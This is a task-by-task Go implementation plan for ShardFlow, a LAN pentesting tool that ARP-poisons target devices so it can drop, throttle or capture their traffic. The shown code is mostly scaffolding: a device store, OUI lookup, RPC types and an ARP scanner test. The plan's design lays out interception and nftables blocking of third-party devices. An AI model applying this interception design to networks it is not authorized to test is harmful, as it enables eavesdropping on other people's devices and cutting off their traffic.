# ShardFlow v1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the v1 ShardFlow product per `docs/superpowers/specs/2026-05-06-shardflow-design.md` — a Linux Layer-2 LAN workbench for authorized pentesting that discovers devices and applies per-target drop / throttle / pcap policies via ARP poisoning, with a kernel data plane (`nftables` + `tc` + `AF_PACKET`) and a Go control plane exposed as a daemon (`shardflowd`) plus a CLI/TUI client (`shardflow`).

**Architecture:** Two binaries in one repo. Privileged `shardflowd` owns kernel state and exposes JSON-RPC 2.0 over `/run/shardflow/sock`. Unprivileged `shardflow` provides Cobra CLI subcommands and a bubbletea TUI; both speak the same RPC. Internal packages under `internal/` follow the spec's component breakdown: `devicestore`, `oui`, `scan/{active,passive,mdns,ssdp}`, `arpengine`, `nftmgr`, `tcmgr`, `pcapwriter`, `policycompiler`, `rpc`, `cli`, `tui`. The load-bearing abstraction is `policycompiler`, which translates a desired `target → policy` map into an ordered sequence of effector calls with reverse-order rollback on failure.

**Tech Stack:** Go 1.22+, `gopacket` (packet parsing), `gopacket/pcap` (libpcap binding) for all data-plane packet I/O (scanners, ARP engine, pcapwriter), `pcapgo.NgWriter` for pcap-ng output, shell-out to `nft(8)` and `tc(8)` for the kernel control plane, `spf13/cobra` (CLI), `charmbracelet/bubbletea` + `lipgloss` (TUI), hand-rolled JSON-RPC 2.0 (for bidirectional event support). Testing: stdlib `testing`, `stretchr/testify` for assertions, Linux network namespaces for integration.

**Spec-divergence note (recorded):** the spec mentions `AF_PACKET` broadly for the data-plane packet I/O paths; this plan uses `gopacket/pcap` (which on Linux opens an `AF_PACKET` socket internally) for **all** packet I/O — scanners, ARP engine, and pcapwriter. The libpcap-vs-afpacket divergence on `pcapwriter` was reverted because per-target BPF filtering (needed so multiple concurrent pcap policies don't duplicate every mirrored frame into every target's file) is one library call away with `gopacket/pcap`'s `SetBPFFilter`, but requires hand-compiling raw BPF and attaching via `afpacket.SetBPF` otherwise. The pcap-ng output format is preserved via `pcapgo.NgWriter` regardless. If the libpcap runtime dependency is unacceptable, swap to `gopacket/afpacket` everywhere in a follow-up; per-target BPF compilation via `pcap.CompileBPFFilter` is the bridge.

**Key conventions every task must follow:**
- TDD: write the failing test, run it, implement, run again, commit.
- One package per task. Tests live next to code (`foo.go` / `foo_test.go`).
- All commits use Conventional Commits: `feat(pkg): …`, `test(pkg): …`, `chore: …`.
- Public APIs documented with Go doc comments. Internal helpers don't need them.
- Interfaces defined where consumed, not where implemented (Go idiom).
- No `panic` outside `main()`. Errors are returned and wrapped with `%w`.

**Out of scope for this plan** (per spec §3): IPv6, TLS interception, HTTP rewrite, scripting, OS fingerprinting, web UI, cross-platform builds, persistent state, authorization scaffolding.

**Directionality decision (recorded so the implementer doesn't relitigate):**
- **Drop:** egress-only — match `ether saddr <target>` and drop. Target can no longer send anything; replies don't come back because nothing's going out. Sufficient for "isolate."
- **Throttle:** egress-only — match `ether saddr <target>` and mark. Documented v1 limitation: the return path (gateway→target) is unthrottled; in practice the asymmetry of normal traffic plus TCP's congestion control still produces visibly degraded throughput, which is the goal.
- **Pcap:** **bidirectional** — two nft mark rules per target: `ether saddr <target> → mark` and `ether saddr <gateway_mac> ip daddr <target_ip> → mark`. Egress-only pcap would capture requests but never responses, which would defeat the "see what this device is talking to" use case.

Per-target rules are tagged with an nft `comment` of `shardflow:<mac>` so `nftmgr.RemoveTarget` can find every rule belonging to a target — egress and return — by comment match rather than fragile MAC-substring scanning.

**Implementer-discretion cleanups (apply if they read clean, ignore otherwise):**
- `github.com/google/gopacket` is in maintenance mode; the active fork is `github.com/gopacket/gopacket`. Either works; if you choose the fork, change every `import` line consistently across all packages.

**Operator footguns (document in README, do not gate v1):**
- `--clean-on-start` removes the **whole** ingress qdisc on the operator's real iface, not just ShardFlow's filters. Any unrelated `tc` filters another tool placed there are destroyed. This is acceptable for dedicated lab/test interfaces; on a workstation that has other tc state, run shardflowd in a netns or accept the loss.
- `internal/scan/mdns` binds UDP port 5353 explicitly. On hosts running `avahi-daemon` (default on most desktop Linux distros) the bind fails with `EADDRINUSE`. Workarounds, in order of preference: stop avahi for the session (`systemctl stop avahi-daemon`), run shardflowd in a netns, or change the package to bind ephemeral with `SO_REUSEPORT`. Documented as a known v1 limitation.

**Implementer verification (before merging Task 3.2):**
- Chain definitions are piped to `nft -f -` via stdin (one atomic transaction at startup) to side-step any argv-quoting concerns around curly-brace bodies. Per-rule add/delete still uses argv. Verify the comment-quoting (`"comment", "\"shardflow:<mac>\""`) on the first integration-test run; if nft rejects it, route those rule-adds through `nft -f -` too.

---

## Phase 0: Bootstrap

### Task 0.1: Initialise Go module and repository layout

**Files:**
- Create: `go.mod`
- Create: `go.sum` (generated)
- Create: `.gitignore`
- Create: `README.md`
- Create: `cmd/shardflow/main.go` (stub)
- Create: `cmd/shardflowd/main.go` (stub)
- Create: `internal/.keep`

- [ ] **Step 1: Initialise the Go module**

Run from repo root:

```bash
go mod init github.com/hett-patell/ShardFlow
```

Expected: creates `go.mod` with `module github.com/hett-patell/ShardFlow` and `go 1.22`.

- [ ] **Step 2: Create `.gitignore`**

```
# Binaries
/bin/
/cmd/shardflow/shardflow
/cmd/shardflowd/shardflowd

# Test artifacts
*.pcap
/coverage.out
/coverage.html

# Editor
.idea/
.vscode/
*.swp

# OS
.DS_Store
```

- [ ] **Step 3: Create stub `cmd/shardflow/main.go`**

```go
package main

import (
	"fmt"
	"os"
)

func main() {
	fmt.Fprintln(os.Stderr, "shardflow: not yet implemented")
	os.Exit(1)
}
```

- [ ] **Step 4: Create stub `cmd/shardflowd/main.go`**

```go
package main

import (
	"fmt"
	"os"
)

func main() {
	fmt.Fprintln(os.Stderr, "shardflowd: not yet implemented")
	os.Exit(1)
}
```

- [ ] **Step 5: Verify the module builds**

```bash
go build ./...
```

Expected: exits 0, builds both binaries with their stub implementations.

- [ ] **Step 6: Create minimal `README.md`**

```markdown
# ShardFlow

Linux Layer-2 LAN workbench for authorized pentesting and lab use.

See `docs/superpowers/specs/2026-05-06-shardflow-design.md` for the full design.

## Building

    go build ./...

## Running

Requires `CAP_NET_RAW` and `CAP_NET_ADMIN` for `shardflowd`. See the spec for
details.
```

- [ ] **Step 7: Commit**

```bash
git add .
git commit -m "chore: initialise Go module and stub binaries"
```

---

### Task 0.2: Add Makefile with build, test, lint, and integration-test targets

**Files:**
- Create: `Makefile`
- Modify: `.gitignore` (add `bin/` if not already present)

- [ ] **Step 1: Write the Makefile**

```make
GO       ?= go
BIN_DIR  := bin
BINS     := shardflow shardflowd

.PHONY: all build test lint vet fmt clean test-env test-int help

all: build

build: $(addprefix $(BIN_DIR)/, $(BINS))

$(BIN_DIR)/%: cmd/%/*.go
	@mkdir -p $(BIN_DIR)
	$(GO) build -o $@ ./cmd/$*

test:
	$(GO) test ./...

vet:
	$(GO) vet ./...

fmt:
	$(GO) fmt ./...

lint: vet
	@which golangci-lint > /dev/null && golangci-lint run || echo "(skipping golangci-lint, not installed)"

clean:
	rm -rf $(BIN_DIR) coverage.out coverage.html

# Integration test environment: requires root (creates network namespaces).
test-env:
	sudo bash test/netns/setup.sh

test-int:
	sudo $(GO) test -tags=integration -v ./test/...

help:
	@echo "Targets: build test lint vet fmt clean test-env test-int"
```

- [ ] **Step 2: Verify the build target works**

```bash
make build
```

Expected: produces `bin/shardflow` and `bin/shardflowd`.

- [ ] **Step 3: Verify the test target works (no tests yet, but should exit 0)**

```bash
make test
```

Expected: `ok ... (cached)` or similar; exit 0.

- [ ] **Step 4: Commit**

```bash
git add Makefile .gitignore
git commit -m "chore: add Makefile with build, test, lint, and integration-test targets"
```

---

## Phase 1: Pure-Go core

### Task 1.1: `internal/devicestore` — MAC-keyed device map with subscription

**Files:**
- Create: `internal/devicestore/store.go`
- Create: `internal/devicestore/store_test.go`

The store is the single source of truth for "what's on the LAN right now." It's MAC-keyed; IPs may change. It supports `Upsert`, `Get`, `ResolveIP`, `List`, and a `Subscribe` channel that emits events on every state change.

- [ ] **Step 1: Write failing test for `Upsert` and `Get`**

In `internal/devicestore/store_test.go`:

```go
package devicestore

import (
	"net"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func mac(s string) net.HardwareAddr {
	m, err := net.ParseMAC(s)
	if err != nil {
		panic(err)
	}
	return m
}

func TestUpsertAndGet(t *testing.T) {
	s := New()
	now := time.Now()
	s.Upsert(Observation{
		MAC:      mac("aa:bb:cc:dd:ee:01"),
		IP:       net.ParseIP("10.0.0.42"),
		Hostname: "iphone.local",
		Vendor:   "Apple",
		Seen:     now,
	})
	d, ok := s.Get(mac("aa:bb:cc:dd:ee:01"))
	require.True(t, ok)
	assert.Equal(t, "10.0.0.42", d.IP.String())
	assert.Equal(t, "iphone.local", d.Hostname)
	assert.Equal(t, "Apple", d.Vendor)
	assert.Equal(t, now, d.LastSeen)
}
```

- [ ] **Step 2: Add `testify` dependency**

```bash
go get github.com/stretchr/testify@latest
```

- [ ] **Step 3: Run the test, confirm it fails**

```bash
go test ./internal/devicestore/...
```

Expected: FAIL — `New`, `Observation`, `Upsert`, `Get` undefined.

- [ ] **Step 4: Implement the store**

In `internal/devicestore/store.go`:

```go
// Package devicestore is the in-memory map of devices observed on the LAN.
// MAC addresses are the canonical identifier; IPs may change over time.
package devicestore

import (
	"bytes"
	"net"
	"sort"
	"sync"
	"time"
)

// Device is the public record for a host we have observed.
type Device struct {
	MAC      net.HardwareAddr
	IP       net.IP
	Hostname string
	Vendor   string
	LastSeen time.Time
	// Policy is set by policycompiler; nil means "no policy".
	Policy any // typed by callers; the store doesn't interpret it
}

// Observation is one fact about a device, fed in by a scanner.
// Empty fields mean "no new information"; the store will preserve prior values.
type Observation struct {
	MAC      net.HardwareAddr
	IP       net.IP
	Hostname string
	Vendor   string
	Seen     time.Time
}

// EventKind enumerates store mutations broadcast to subscribers.
type EventKind int

const (
	EventDiscovered EventKind = iota
	EventUpdated
)

// Event is what subscribers receive.
type Event struct {
	Kind   EventKind
	Device Device
}

// Store is the device map. Safe for concurrent use.
type Store struct {
	mu     sync.RWMutex
	byMAC  map[string]*Device
	subsMu sync.Mutex
	subs   map[chan Event]struct{}
}

// New returns an empty store.
func New() *Store {
	return &Store{byMAC: make(map[string]*Device), subs: map[chan Event]struct{}{}}
}

// Upsert merges an observation into the store. New MAC = discovery; existing
// MAC = update (only non-empty fields overwrite).
func (s *Store) Upsert(o Observation) {
	if len(o.MAC) == 0 {
		return
	}
	key := o.MAC.String()
	s.mu.Lock()
	d, existed := s.byMAC[key]
	if !existed {
		d = &Device{MAC: append(net.HardwareAddr{}, o.MAC...)}
		s.byMAC[key] = d
	}
	if o.IP != nil {
		d.IP = append(net.IP{}, o.IP...)
	}
	if o.Hostname != "" {
		d.Hostname = o.Hostname
	}
	if o.Vendor != "" {
		d.Vendor = o.Vendor
	}
	if !o.Seen.IsZero() {
		d.LastSeen = o.Seen
	}
	snapshot := *d
	s.mu.Unlock()

	kind := EventUpdated
	if !existed {
		kind = EventDiscovered
	}
	s.broadcast(Event{Kind: kind, Device: snapshot})
}

// Get returns a device by MAC, or (zero, false) if unknown.
func (s *Store) Get(m net.HardwareAddr) (Device, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	d, ok := s.byMAC[m.String()]
	if !ok {
		return Device{}, false
	}
	return *d, true
}

// ResolveIP looks up the MAC currently associated with the given IP.
// Returns (mac, true) on hit, (nil, false) on miss.
func (s *Store) ResolveIP(ip net.IP) (net.HardwareAddr, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	for _, d := range s.byMAC {
		if d.IP.Equal(ip) {
			return append(net.HardwareAddr{}, d.MAC...), true
		}
	}
	return nil, false
}

// List returns a snapshot of all known devices, sorted by IP for stable output.
func (s *Store) List() []Device {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]Device, 0, len(s.byMAC))
	for _, d := range s.byMAC {
		out = append(out, *d)
	}
	sort.Slice(out, func(i, j int) bool {
		return bytes.Compare(out[i].IP, out[j].IP) < 0
	})
	return out
}

// SetPolicy updates the typed-as-any policy field for a known MAC.
// Returns false if the MAC is unknown.
func (s *Store) SetPolicy(m net.HardwareAddr, p any) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	d, ok := s.byMAC[m.String()]
	if !ok {
		return false
	}
	d.Policy = p
	snapshot := *d
	go s.broadcast(Event{Kind: EventUpdated, Device: snapshot})
	return true
}

// Subscribe returns a channel that receives every event. Buffer size 64 —
// slow consumers drop oldest events (best-effort). Caller should call
// Unsubscribe with the returned channel when done to avoid a goroutine
// leak.
func (s *Store) Subscribe() chan Event {
	ch := make(chan Event, 64)
	s.subsMu.Lock()
	s.subs[ch] = struct{}{}
	s.subsMu.Unlock()
	return ch
}

// Unsubscribe removes ch from the subscriber set and closes it. Safe to
// call multiple times; subsequent calls are no-ops.
func (s *Store) Unsubscribe(ch chan Event) {
	s.subsMu.Lock()
	defer s.subsMu.Unlock()
	if _, ok := s.subs[ch]; !ok {
		return
	}
	delete(s.subs, ch)
	close(ch)
}

func (s *Store) broadcast(e Event) {
	s.subsMu.Lock()
	defer s.subsMu.Unlock()
	for ch := range s.subs {
		select {
		case ch <- e:
		default:
			// drop on full buffer; the consumer is slow
		}
	}
}
```

- [ ] **Step 5: Run the test, confirm it passes**

```bash
go test ./internal/devicestore/...
```

Expected: PASS.

- [ ] **Step 6: Add tests for `ResolveIP`, `List`, `Subscribe`, and update-only-non-empty semantics**

Append to `internal/devicestore/store_test.go`:

```go
func TestResolveIP(t *testing.T) {
	s := New()
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:01"), IP: net.ParseIP("10.0.0.42")})
	m, ok := s.ResolveIP(net.ParseIP("10.0.0.42"))
	require.True(t, ok)
	assert.Equal(t, "aa:bb:cc:dd:ee:01", m.String())

	_, ok = s.ResolveIP(net.ParseIP("10.0.0.99"))
	assert.False(t, ok)
}

func TestUpsertPreservesPriorFields(t *testing.T) {
	s := New()
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:01"), Vendor: "Apple"})
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:01"), IP: net.ParseIP("10.0.0.42")})
	d, _ := s.Get(mac("aa:bb:cc:dd:ee:01"))
	assert.Equal(t, "Apple", d.Vendor, "vendor should not be cleared by an observation that doesn't set it")
	assert.Equal(t, "10.0.0.42", d.IP.String())
}

func TestSubscribeDiscoveredAndUpdated(t *testing.T) {
	s := New()
	ch := s.Subscribe()
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:01"), IP: net.ParseIP("10.0.0.42")})
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:01"), Hostname: "h1"})

	select {
	case e := <-ch:
		assert.Equal(t, EventDiscovered, e.Kind)
	case <-time.After(time.Second):
		t.Fatal("expected discovered event")
	}
	select {
	case e := <-ch:
		assert.Equal(t, EventUpdated, e.Kind)
		assert.Equal(t, "h1", e.Device.Hostname)
	case <-time.After(time.Second):
		t.Fatal("expected updated event")
	}
}

func TestList(t *testing.T) {
	s := New()
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:01")})
	s.Upsert(Observation{MAC: mac("aa:bb:cc:dd:ee:02")})
	assert.Len(t, s.List(), 2)
}

func TestSetPolicyUnknownMAC(t *testing.T) {
	s := New()
	ok := s.SetPolicy(mac("aa:bb:cc:dd:ee:99"), "drop")
	assert.False(t, ok)
}
```

- [ ] **Step 7: Run the full test suite, confirm all pass**

```bash
go test ./internal/devicestore/...
```

Expected: PASS, all five tests.

- [ ] **Step 8: Commit**

```bash
git add internal/devicestore/ go.mod go.sum
git commit -m "feat(devicestore): MAC-keyed device map with subscribe channel"
```

---

### Task 1.2: `internal/oui` — embedded OUI vendor lookup

**Files:**
- Create: `internal/oui/oui.go`
- Create: `internal/oui/oui_test.go`
- Create: `internal/oui/data/oui.txt` (downloaded; small subset committed in this task, full DB downloaded by `go generate`)
- Create: `internal/oui/gen.go` (`go:generate` directive)

The package looks up vendor strings from MAC address OUI prefixes. Database is embedded at build time so the binary needs no runtime data file.

- [ ] **Step 1: Write the failing test**

In `internal/oui/oui_test.go`:

```go
package oui

import (
	"net"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestLookupKnownVendor(t *testing.T) {
	mac, _ := net.ParseMAC("3C:22:FB:AA:BB:CC") // Apple
	v := Lookup(mac)
	assert.Contains(t, v, "Apple")
}

func TestLookupUnknownVendor(t *testing.T) {
	mac, _ := net.ParseMAC("00:00:00:AA:BB:CC")
	v := Lookup(mac)
	assert.Equal(t, "", v)
}

func TestLookupShortMAC(t *testing.T) {
	assert.Equal(t, "", Lookup(net.HardwareAddr{0x01, 0x02}))
}
```

- [ ] **Step 2: Run the test, confirm it fails**

```bash
go test ./internal/oui/...
```

Expected: FAIL — `Lookup` undefined.

- [ ] **Step 3: Create a minimal seed DB at `internal/oui/data/oui.txt`**

(Full DB will replace this via `go generate`. The seed only needs the entries the tests reference.)

```
3C22FB Apple, Inc.
B827EB Raspberry Pi Foundation
8CF5A3 Samsung Electronics
```

- [ ] **Step 4: Implement the package**

In `internal/oui/oui.go`:

```go
// Package oui maps MAC OUI prefixes (first 24 bits) to vendor strings,
// using an IEEE OUI database embedded at build time.
package oui

import (
	_ "embed"
	"fmt"
	"net"
	"strings"
	"sync"
)

//go:embed data/oui.txt
var rawDB string

var (
	once   sync.Once
	byOUI  map[uint32]string
)

func load() {
	byOUI = make(map[uint32]string, 32000)
	for _, line := range strings.Split(rawDB, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// Format: "AABBCC Vendor Name, Inc."
		fields := strings.SplitN(line, " ", 2)
		if len(fields) != 2 {
			continue
		}
		prefix, err := parseOUI(fields[0])
		if err != nil {
			continue
		}
		byOUI[prefix] = strings.TrimSpace(fields[1])
	}
}

func parseOUI(s string) (uint32, error) {
	// IEEE OUI database lines are bare 6-hex-char prefixes ("3C22FB").
	// net.ParseMAC requires explicit separators, so insert them.
	if len(s) < 6 {
		return 0, fmt.Errorf("oui prefix too short: %q", s)
	}
	hw, err := net.ParseMAC(s[0:2] + ":" + s[2:4] + ":" + s[4:6] + ":00:00:00")
	if err != nil {
		return 0, err
	}
	return uint32(hw[0])<<16 | uint32(hw[1])<<8 | uint32(hw[2]), nil
}

// Lookup returns the vendor string for the OUI of m, or "" if unknown.
func Lookup(m net.HardwareAddr) string {
	if len(m) < 3 {
		return ""
	}
	once.Do(load)
	prefix := uint32(m[0])<<16 | uint32(m[1])<<8 | uint32(m[2])
	return byOUI[prefix]
}
```

- [ ] **Step 5: Add `gen.go` for fetching the full DB later**

```go
//go:build generate
// +build generate

package oui

//go:generate sh -c "curl -s https://standards-oui.ieee.org/oui/oui.txt | awk '/\\(base 16\\)/ { gsub(\"-\", \"\", $$1); print $$1, substr($$0, index($$0,\"(base 16)\")+11) }' > data/oui.txt"
```

- [ ] **Step 6: Run the tests, confirm they pass**

```bash
go test ./internal/oui/...
```

Expected: PASS.

- [ ] **Step 7: Commit (with the seed DB; full DB regenerate documented in README)**

```bash
git add internal/oui/ README.md
git commit -m "feat(oui): MAC OUI vendor lookup with embedded seed database"
```

- [ ] **Step 8: Append a "Regenerating the OUI database" section to README**

```markdown
## Regenerating the OUI database

The OUI vendor database is embedded at build time. To refresh it from
IEEE's source:

    go generate ./internal/oui/...

Commit the resulting `internal/oui/data/oui.txt`.
```

```bash
git add README.md
git commit -m "docs: document OUI database regeneration"
```

---

### Task 1.3: `internal/iface` — interface info helper

**Files:**
- Create: `internal/iface/iface.go`
- Create: `internal/iface/iface_test.go`

Tiny utility used by every effector and scanner: given an interface name, return the iface index, hardware address, IPv4 address, IPv4 CIDR, and discovered gateway. Centralised so we don't hand-roll netlink in five places.

- [ ] **Step 1: Write the failing test**

In `internal/iface/iface_test.go`:

```go
package iface

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestLookupLoopback(t *testing.T) {
	info, err := Lookup("lo")
	require.NoError(t, err)
	assert.Equal(t, "lo", info.Name)
	assert.Greater(t, info.Index, 0)
}

func TestLookupMissing(t *testing.T) {
	_, err := Lookup("definitely-not-a-real-iface-xyz")
	assert.Error(t, err)
}
```

- [ ] **Step 2: Run the test, confirm it fails**

```bash
go test ./internal/iface/...
```

Expected: FAIL — `Lookup` undefined.

- [ ] **Step 3: Implement**

In `internal/iface/iface.go`:

```go
// Package iface gathers the interface facts the daemon needs at startup
// and during operation: index, hardware address, IPv4 address, CIDR, and
// (best-effort) the IPv4 default-route gateway reachable on this iface.
package iface

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
)

// Info is the snapshot of facts about a single interface.
type Info struct {
	Name    string
	Index   int
	HwAddr  net.HardwareAddr
	IP      net.IP
	IPNet   *net.IPNet // the iface's IPv4 CIDR
	Gateway net.IP     // best-effort IPv4 default gateway; nil if unknown
}

// Lookup returns Info for the named interface. The Gateway field is
// populated by parsing `ip route show default`; if that fails, Gateway is nil
// and the caller is expected to handle it.
func Lookup(name string) (Info, error) {
	netIf, err := net.InterfaceByName(name)
	if err != nil {
		return Info{}, fmt.Errorf("iface %s: %w", name, err)
	}
	addrs, err := netIf.Addrs()
	if err != nil {
		return Info{}, fmt.Errorf("iface %s addrs: %w", name, err)
	}
	info := Info{Name: name, Index: netIf.Index, HwAddr: netIf.HardwareAddr}
	for _, a := range addrs {
		ipnet, ok := a.(*net.IPNet)
		if !ok || ipnet.IP.To4() == nil {
			continue
		}
		info.IP = ipnet.IP.To4()
		info.IPNet = &net.IPNet{IP: info.IP, Mask: ipnet.Mask}
		break
	}
	info.Gateway = defaultGateway(name)
	return info, nil
}

// defaultGateway shells out to `ip` because parsing rtnetlink for the route
// table is overkill for one read. Returns nil on any error.
func defaultGateway(iface string) net.IP {
	out, err := exec.Command("ip", "-4", "route", "show", "default", "dev", iface).Output()
	if err != nil {
		return nil
	}
	// Format: "default via 10.0.0.1 dev wlan0 proto dhcp metric 600"
	fields := strings.Fields(string(out))
	for i, f := range fields {
		if f == "via" && i+1 < len(fields) {
			return net.ParseIP(fields[i+1])
		}
	}
	return nil
}
```

- [ ] **Step 4: Run, confirm pass**

```bash
go test ./internal/iface/...
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/iface/
git commit -m "feat(iface): interface info helper (index, MAC, CIDR, gateway)"
```

---

### Task 1.4: `internal/rpc/types` — shared wire types

**Files:**
- Create: `internal/rpc/types.go`
- Create: `internal/rpc/types_test.go`

Defines the request/response/event wire format used by both the daemon and the client. JSON-RPC 2.0 envelope; ShardFlow-specific method params and event payloads.

- [ ] **Step 1: Write the failing test**

In `internal/rpc/types_test.go`:

```go
package rpc

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestRequestRoundTrip(t *testing.T) {
	r := Request{
		JSONRPC: "2.0",
		ID:      json.RawMessage(`1`),
		Method:  "Policy.Set",
		Params:  json.RawMessage(`{"target":"10.0.0.42","kind":"throttle","rate_kbit":200}`),
	}
	b, err := json.Marshal(r)
	require.NoError(t, err)

	var back Request
	require.NoError(t, json.Unmarshal(b, &back))
	assert.Equal(t, "Policy.Set", back.Method)
}

func TestPolicyKindMarshal(t *testing.T) {
	for _, k := range []PolicyKind{PolicyDrop, PolicyThrottle, PolicyPcap} {
		b, err := json.Marshal(k)
		require.NoError(t, err)
		var back PolicyKind
		require.NoError(t, json.Unmarshal(b, &back))
		assert.Equal(t, k, back)
	}
}

func TestEventEnvelope(t *testing.T) {
	ev := Event{
		JSONRPC: "2.0",
		Method:  "device.discovered",
		Params:  json.RawMessage(`{"mac":"aa:bb:cc:dd:ee:01","ip":"10.0.0.42"}`),
	}
	b, err := json.Marshal(ev)
	require.NoError(t, err)
	assert.Contains(t, string(b), `"method":"device.discovered"`)
	// Events have no "id" field (notification per JSON-RPC 2.0 §4.1).
	assert.NotContains(t, string(b), `"id"`)
}
```

- [ ] **Step 2: Run the test, confirm it fails**

```bash
go test ./internal/rpc/...
```

Expected: FAIL — `Request`, `Event`, `PolicyKind`, etc. undefined.

- [ ] **Step 3: Implement `internal/rpc/types.go`**

```go
// Package rpc defines the JSON-RPC 2.0 wire types and method/event constants
// shared between shardflowd's server and shardflow's client.
package rpc

import "encoding/json"

// Request is a JSON-RPC 2.0 request frame.
type Request struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id,omitempty"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

// Response is a JSON-RPC 2.0 response frame. Exactly one of Result or Error is set.
type Response struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id"`
	Result  json.RawMessage `json:"result,omitempty"`
	Error   *Error          `json:"error,omitempty"`
}

// Event is a server-initiated notification frame (no ID per JSON-RPC §4.1).
type Event struct {
	JSONRPC string          `json:"jsonrpc"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

// Error is the JSON-RPC 2.0 error object.
type Error struct {
	Code    int             `json:"code"`
	Message string          `json:"message"`
	Data    json.RawMessage `json:"data,omitempty"`
}

func (e *Error) Error() string { return e.Message }

// JSON-RPC 2.0 standard error codes.
const (
	CodeParseError     = -32700
	CodeInvalidRequest = -32600
	CodeMethodNotFound = -32601
	CodeInvalidParams  = -32602
	CodeInternalError  = -32603
)

// ShardFlow-specific error codes (range -32000..-32099 per §5.1).
const (
	CodeUnknownTarget   = -32000
	CodeOutOfCIDR       = -32001
	CodeGatewayIsSelf   = -32002
	CodeIfaceDown       = -32003
	CodePcapPathInvalid = -32004
)

// DeviceDTO is the wire form of devicestore.Device. Necessary because
// net.HardwareAddr and net.IP marshal as base64 byte arrays in JSON, while
// every consumer (CLI table, --json, TUI, integration tests) expects the
// dotted/colon string form. Wire conversion happens in the RPC handlers.
type DeviceDTO struct {
	MAC      string `json:"mac"`
	IP       string `json:"ip"`
	Hostname string `json:"hostname"`
	Vendor   string `json:"vendor"`
	LastSeen string `json:"last_seen"` // RFC 3339; time.Time also marshals OK but string keeps the wire stable
	Policy   string `json:"policy,omitempty"`
}

// PolicyEntryDTO is the wire form of one policycompiler.Spec.
type PolicyEntryDTO struct {
	MAC      string `json:"mac"`
	Kind     string `json:"kind"` // "drop" | "throttle" | "pcap"
	RateKbit int    `json:"rate_kbit,omitempty"`
	PcapDir  string `json:"pcap_dir,omitempty"`
}

// PolicyKind enumerates the three v1 policy types.
type PolicyKind string

const (
	PolicyDrop     PolicyKind = "drop"
	PolicyThrottle PolicyKind = "throttle"
	PolicyPcap     PolicyKind = "pcap"
)

// PolicySpec is the params shape for Policy.Set.
type PolicySpec struct {
	// Target accepts either an IPv4 address or a MAC. The daemon resolves
	// IP→MAC at command time via devicestore.
	Target   string     `json:"target"`
	Kind     PolicyKind `json:"kind"`
	RateKbit int        `json:"rate_kbit,omitempty"` // throttle only
	PcapDir  string     `json:"pcap_dir,omitempty"`  // pcap only; empty = default
}

// Method names, exported as constants so client and server can't drift.
const (
	MethodScan        = "Scan"
	MethodDevicesList = "Devices.List"
	MethodDevicesGet  = "Devices.Get"
	MethodPolicySet   = "Policy.Set"
	MethodPolicyClear = "Policy.Clear"
	MethodPolicyList  = "Policy.List"
	MethodStats       = "Stats"
)

// Event method names.
const (
	EventDeviceDiscovered = "device.discovered"
	EventDeviceUpdated    = "device.updated"
	EventPolicyApplied    = "policy.applied"
	EventCountersTick     = "counters.tick"
	EventPcapRotated      = "pcap.rotated"
	EventIfaceDown        = "iface.down"
	EventIfaceUp          = "iface.up"
)
```

- [ ] **Step 4: Run the test, confirm it passes**

```bash
go test ./internal/rpc/...
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/rpc/
git commit -m "feat(rpc): JSON-RPC 2.0 wire types and method/event constants"
```

---

## Phase 2: Discovery scanners

All scanners feed `devicestore.Observation` values into a shared store. They share two helpers: a raw-socket opener (for AF_PACKET-based scanners) and a `gopacket` parser. We use `github.com/google/gopacket` because it is the de-facto standard for Go packet parsing.

### Task 2.1: `internal/scan/active` — active ARP sweep

**Files:**
- Create: `internal/scan/active/active.go`
- Create: `internal/scan/active/active_test.go`

Sends ARP requests to every host in the iface's IPv4 CIDR. Listens for replies for a configurable window (default 2 s). Each reply produces an Observation `{MAC, IP, Seen=now()}` fed into a callback (which the daemon wires to `devicestore.Upsert`).

- [ ] **Step 1: Add gopacket dependency**

```bash
go get github.com/google/gopacket@latest
```

- [ ] **Step 2: Write failing test for the ARP-frame builder**

In `internal/scan/active/active_test.go`:

```go
package active

import (
	"net"
	"testing"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestBuildARPRequestFrame(t *testing.T) {
	srcMAC, _ := net.ParseMAC("aa:bb:cc:dd:ee:01")
	srcIP := net.ParseIP("10.0.0.5").To4()
	dstIP := net.ParseIP("10.0.0.42").To4()

	frame, err := buildARPRequest(srcMAC, srcIP, dstIP)
	require.NoError(t, err)

	pkt := gopacket.NewPacket(frame, layers.LayerTypeEthernet, gopacket.Default)
	eth := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	arp := pkt.Layer(layers.LayerTypeARP).(*layers.ARP)

	assert.Equal(t, layers.EthernetTypeARP, eth.EthernetType)
	assert.Equal(t, "ff:ff:ff:ff:ff:ff", net.HardwareAddr(eth.DstMAC).String())
